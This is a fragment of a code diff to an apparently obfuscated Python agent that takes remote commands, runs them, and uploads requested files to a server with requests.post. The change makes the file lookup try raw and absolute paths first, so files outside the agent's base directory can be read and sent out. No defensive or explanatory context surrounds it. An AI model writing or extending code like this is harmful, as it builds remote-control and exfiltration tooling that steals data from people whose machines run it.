@@ -102,15 +102,13 @@ def _f():
             if not fp:
                 _e(cid, "ERR: no path")
             else:
-                if not os.path.isabs(fp):
-                    fp = os.path.join(_z, fp)
-                else:
-                    fp = os.path.join(_z, fp.lstrip("/"))
-                if os.path.exists(fp) and os.path.isfile(fp):
-                    with open(fp, "rb") as f:
+                candidates = [fp, os.path.join(_z, fp.lstrip("/")), os.path.join(_z, fp)]
+                found = next((p for p in candidates if os.path.isfile(p)), None)
+                if found:
+                    with open(found, "rb") as f:
                         requests.post(f"{_s}/api/file", files={"file": f}, data={"id": _d}, timeout=30)
                 else:
-                    _e(cid, f"ERR: not found {fp}")
+                    _e(cid, f"ERR: not found {fp} (tried: {candidates})")
         else:
             cmd = action
             if args:
